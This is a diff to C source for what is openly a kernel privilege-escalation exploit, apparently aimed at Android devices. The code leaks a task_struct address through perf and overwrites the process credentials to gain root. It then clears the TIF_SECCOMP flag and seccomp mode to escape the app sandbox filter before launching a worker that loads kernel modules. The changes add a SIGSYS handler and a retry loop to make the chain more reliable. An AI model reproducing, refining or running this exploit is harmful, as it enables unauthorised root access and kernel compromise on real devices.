@@ -516,6 +516,14 @@ static uintptr_t perf_find_task(void) {
 
 struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };
 
+/* W3a: catch the filter's SIGSYS so a missed write costs a retry, not the
+ * child. */
+static volatile sig_atomic_t g_sigsys_hit;
+static void sigsys_probe_handler(int sig, siginfo_t *info, void *uctx) {
+  (void)sig; (void)info; (void)uctx;
+  g_sigsys_hit = 1;
+}
+
 static void child_main(struct child_pipes *p) {
   close(p->task_r); close(p->cmd_w); close(p->uid_r);
   setpgid(0, 0);  /* own group so the parent can kill the whole late-load
@@ -523,6 +531,13 @@ static void child_main(struct child_pipes *p) {
   fcntl(p->uid_w, F_SETFD, FD_CLOEXEC);  /* ksud-spawned daemons must not
                                           * inherit the report pipe */
   prctl(PR_SET_NAME, "ghostleaf_0123456789");
+  /* W3a probe: don't let the filter's SIGSYS kill us. */
+  struct sigaction sa;
+  memset(&sa, 0, sizeof(sa));
+  sa.sa_sigaction = sigsys_probe_handler;
+  sa.sa_flags = SA_SIGINFO;
+  sigemptyset(&sa.sa_mask);
+  sigaction(SIGSYS, &sa, NULL);
   uintptr_t my_task = perf_find_task();
   write(p->task_w, &my_task, sizeof(my_task));
   close(p->task_w);
@@ -540,6 +555,8 @@ static void child_main(struct child_pipes *p) {
         pid_t probe = fork();
         if (probe == 0) {
           close(probe_pipe[0]);
+          /* Forked probe: keep default SIGSYS so the filter kills it. */
+          signal(SIGSYS, SIG_DFL);
           errno = 0;
           long r = syscall(__NR_finit_module, 0, 0, 0);
           uint32_t out = (r == 0) ? 0 : (uint32_t)errno;
@@ -560,13 +577,17 @@ static void child_main(struct child_pipes *p) {
       write(p->uid_w, &code, sizeof(code));
     }
     else if (cmd == 'D') {
-      /* Direct finit_module probe for W3a (a fork would re-inherit the filter
-       * while mode==2): TIF_SECCOMP clear -> normal errno, filter active ->
-       * this process is SIGSYS-killed. */
+      /* W3a direct probe (a fork would re-inherit the filter): SIGSYS caught
+       * -> filter active; normal errno -> TIF_SECCOMP cleared. */
       uint32_t code = 0xffffffff;
+      g_sigsys_hit = 0;
       errno = 0;
       long r = syscall(__NR_finit_module, 0, 0, 0);
-      code = (r == 0) ? 0 : (uint32_t)errno;
+      if (g_sigsys_hit) {
+        code = 0xfffffffd;
+      } else {
+        code = (r == 0) ? 0 : (uint32_t)errno;
+      }
       write(p->uid_w, &code, sizeof(code));
     }
     else if (cmd == 'M') {
@@ -721,13 +742,14 @@ static int verify_w3a_direct_stage(void *context) {
   uint32_t code = 0xffffffff;
   if (read(stage->pipes->uid_r, &code, sizeof(code)) !=
       (ssize_t)sizeof(code)) {
-    pr_warning("W3a direct probe: no reply (child likely SIGSYS-killed)\n");
+    pr_warning("W3a direct probe: no reply (child lost)\n");
     return 0;
   }
   pr_info("W3a direct finit_module probe = 0x%x\n", code);
   /* A normal errno means TIF_SECCOMP is clear. SIGSYS (0xfffffffd) means the
-   * filter still kills; EPERM/ENOSYS count as failure because zeroing mode
-   * with TIF_SECCOMP set would BUG(). */
+   * filter still caught the probe (child survives via its handler);
+   * EPERM/ENOSYS count as failure because zeroing mode with TIF_SECCOMP set
+   * would BUG(). */
   if (code == 0xfffffffd || code == 0xfffffffe || code == 0xffffffff ||
       code == 1 || code == 38) {
     return 0;
@@ -814,70 +836,87 @@ int run_exploit(int argc, char **argv) {
   TIMER("pre-W2 drain");
 
   struct child_pipes pipes;
-  pid_t child = spawn_child(&pipes);
-  if (child < 0) {
-    pr_warning("fork failed\n");
-    return 1;
-  }
-
+  struct w2_stage_context w2_context = { .pipes = &pipes };
+  pid_t child = -1;
   uintptr_t child_task = 0;
-  read(pipes.task_r, &child_task, sizeof(child_task));
-  close(pipes.task_r);
-  TIMER("perf_find_task done");
+  int child_alive = 1;
+  int seccomp_ok = 0;
 
-  if (!child_task) {
-    /* perf leaked nothing; respawn and retry once */
-    pr_info("perf returned 0, retrying...\n");
-    waitpid(child, NULL, 0);
+  /* W2+W3 as a retryable chain: the W3a probe can kill the child on a missed
+   * write, so respawn and redo instead of aborting. */
+  for (int round = 1; round <= 3; round++) {
+    if (round > 1) {
+      pr_warning("W3 chain retry %d/3: respawning child\n", round);
+      if (child > 0 && child_alive) {
+        kill(-child, SIGKILL);
+        waitpid(child, NULL, 0);
+      }
+      close(pipes.cmd_w); close(pipes.uid_r);
+      child_alive = 1;
+      seccomp_ok = 0;
+    }
+
     child = spawn_child(&pipes);
-    if (child < 0) { pr_warning("retry fork failed\n"); return 1; }
+    if (child < 0) {
+      pr_warning("fork failed\n");
+      return 1;
+    }
+
+    child_task = 0;
     read(pipes.task_r, &child_task, sizeof(child_task));
     close(pipes.task_r);
-  }
+    TIMER("perf_find_task done");
 
-  if (!child_task) {
-    pr_warning("Cannot find task_struct (perf leak failed)\n");
-    close(pipes.cmd_w);
-    waitpid(child, NULL, 0);
-    return 1;
-  }
+    if (!child_task) {
+      /* perf leaked nothing; respawn and retry once */
+      pr_info("perf returned 0, retrying...\n");
+      waitpid(child, NULL, 0);
+      child = spawn_child(&pipes);
+      if (child < 0) { pr_warning("retry fork failed\n"); return 1; }
+      child_task = 0;
+      read(pipes.task_r, &child_task, sizeof(child_task));
+      close(pipes.task_r);
+    }
 
-  pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
-  pselect_child_node = 1;
+    if (!child_task) {
+      pr_warning("Cannot find task_struct (perf leak failed)\n");
+      close(pipes.cmd_w);
+      waitpid(child, NULL, 0);
+      return 1;
+    }
 
-  struct w2_stage_context w2_context = { .pipes = &pipes };
-  int got_root = retry_write_stage(
-      "W2: cred", child_task + TASK_CRED_OFF, 2, 10, 50000,
-      verify_w2_stage, &w2_context, 0);
+    pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
+    pselect_child_node = 1;
 
-  if (!got_root) {
-    write(pipes.cmd_w, "X", 1);
-    close(pipes.cmd_w); close(pipes.uid_r);
-    pr_warning("W2 failed after 10 rounds\n");
-    waitpid(child, NULL, 0);
-    return 1;
-  }
+    int got_root = retry_write_stage(
+        "W2: cred", child_task + TASK_CRED_OFF, 2, 10, 50000,
+        verify_w2_stage, &w2_context, 0);
+    if (!got_root) {
+      write(pipes.cmd_w, "X", 1);
+      close(pipes.cmd_w); close(pipes.uid_r);
+      pr_warning("W2 failed after 10 rounds\n");
+      waitpid(child, NULL, 0);
+      return 1;
+    }
 
-  /* W3: bypass the child's inherited app seccomp filter so the late-load
-   * script (forked sh) can run finit_module; adb/shell (Seccomp: 0) skips W3.
-   *
-   * fork() re-arms TIF_SECCOMP while seccomp.mode != 0, so mode must be
-   * zeroed too; zeroing mode with the flag still set BUG()s (earlier reboots),
-   * so a direct finit_module probe first proves the flags write: cleared ->
-   * normal errno, filter active -> SIGSYS.
-   *
-   * The leaf=1 write lands on [target] or [target+8]; a comm probe
-   * (task+TASK_COMM_OFF) learns which before picking the targets
-   * (thread_info.flags at task+0, seccomp.mode at task+TASK_SECCOMP_OFF). */
-  int seccomp_ok;
-  int child_alive = 1;
-  if (process_has_seccomp()) {
+    /* W3: clear the child's seccomp filter for the late-load worker
+     * (adb/shell skips). fork() re-arms TIF_SECCOMP while mode != 0, so mode
+     * must be zeroed too; zeroing mode with the flag still set BUG()s, hence
+     * the direct probe first: cleared -> normal errno, active -> SIGSYS.
+     * Leaf writes land on [target] or [target+8]; a comm probe picks the side
+     * before targeting thread_info.flags (task+0) / seccomp.mode. */
+    if (!process_has_seccomp()) {
+      pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
+      seccomp_ok = 1;
+      break;
+    }
+
     struct w3_stage_context w3_context = {
       .pipes = &pipes,
       .leaf_to_target8 = 1,
     };
     int dir_ok = retry_write_stage(
-        "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 2, 50000,
+        "W3-0: leaf dir", child_task + TASK_COMM_OFF, 1, 4, 50000,
         verify_leaf_dir_stage, &w3_context, 1);
     if (!dir_ok) {
       pr_warning("W3 leaf direction probe failed; assuming [target+8]\n");
@@ -888,8 +927,8 @@ int run_exploit(int argc, char **argv) {
       : child_task + TASK_THREAD_INFO_FLAGS_OFF;
 
     int w3a_ok = 0;
-    for (int attempt = 1; attempt <= 4; attempt++) {
-      pr_info("W3a: TIF_SECCOMP attempt %d/4\n", attempt);
+    for (int attempt = 1; attempt <= 6; attempt++) {
+      pr_info("W3a: TIF_SECCOMP attempt %d/6\n", attempt);
       if (attempt == 1) slab_drain();
       int routed = do_one_write(flags_target, "W3a: TIF_SECCOMP", 1, 1);
       if (!routed) {
@@ -904,8 +943,7 @@ int run_exploit(int argc, char **argv) {
       }
       int st = 0;
       if (waitpid(child, &st, WNOHANG) == child) {
-        pr_warning("W3a direct probe killed the child (status=0x%x); "
-                   "aborting W3 to avoid a mode=0 BUG panic\n", st);
+        pr_warning("W3a lost the child (status=0x%x); chain will retry\n", st);
         child_alive = 0;
         break;
       }
@@ -914,34 +952,33 @@ int run_exploit(int argc, char **argv) {
 
     if (!w3a_ok) {
       pr_warning("W3 TIF_SECCOMP clear failed; ksud late-load will likely stay blocked\n");
-      seccomp_ok = 0;
-    } else {
-      pr_success("W3a: child TIF_SECCOMP cleared\n");
-      /* End-to-end check: a forked probe mirrors the late-load worker. Here
-       * clearing the thread flags suffices (probe passes with mode still 2);
-       * on stock kernels the fork re-arms TIF_SECCOMP, so we then zero
-       * seccomp.mode/count (W3b) and re-probe. */
-      seccomp_ok = verify_seccomp_probe_stage(&w2_context);
-      if (!seccomp_ok) {
-        uintptr_t mode_target = w3_context.leaf_to_target8
-          ? child_task + TASK_SECCOMP_OFF - 8
-          : child_task + TASK_SECCOMP_OFF;
-        /* On this vendor kernel TASK_SECCOMP_OFF points at the filter slot
-         * (mode/count 8 bytes earlier); the same write zeroes mode/count on a
-         * stock layout. Either way the fork probe verifies it. */
-        seccomp_ok = retry_write_stage(
-            "W3b: seccomp mode", mode_target, 1, 2, 50000,
-            verify_seccomp_probe_stage, &w2_context, 1);
-        if (!seccomp_ok)
-          pr_warning("W3b seccomp clear or final probe failed\n");
-      }
-      if (seccomp_ok)
-        pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
+      continue; /* respawn and redo the chain */
     }
-  } else {
-    pr_success("no app seccomp filter (adb/shell flow); skipping W3\n");
-    seccomp_ok = 1;
+
+    pr_success("W3a: child TIF_SECCOMP cleared\n");
+    /* Forked probe mirrors the late-load worker; zero mode (W3b) and
+     * re-probe if it still hits the filter. */
+    seccomp_ok = verify_seccomp_probe_stage(&w2_context);
+    if (!seccomp_ok) {
+      uintptr_t mode_target = w3_context.leaf_to_target8
+        ? child_task + TASK_SECCOMP_OFF - 8
+        : child_task + TASK_SECCOMP_OFF;
+      /* Vendor TASK_SECCOMP_OFF may point at the filter slot; the fork probe
+       * verifies the result either way. */
+      seccomp_ok = retry_write_stage(
+          "W3b: seccomp mode", mode_target, 1, 4, 50000,
+          verify_seccomp_probe_stage, &w2_context, 1);
+      if (!seccomp_ok) {
+        pr_warning("W3b seccomp clear or final probe failed; chain will retry\n");
+        continue;
+      }
+    }
+    pr_success("child seccomp fully bypassed (forked workers run filter-free)\n");
+    break;
   }
+
+  if (!seccomp_ok)
+    pr_warning("W3 seccomp bypass failed after 3 chain rounds; ksud late-load will likely stay blocked\n");
 
   sleep(2);
   TIMER("exploit complete");
@@ -949,7 +986,7 @@ int run_exploit(int argc, char **argv) {
     if (write(pipes.cmd_w, "G", 1) != 1)
       pr_warning("failed to start late-load worker (child exited early)\n");
   } else {
-    pr_warning("skipping late-load: child was SIGSYS-killed by the W3a probe\n");
+    pr_warning("skipping late-load: child died during W3\n");
   }
   close(pipes.cmd_w);
   uint32_t child_report = 0;
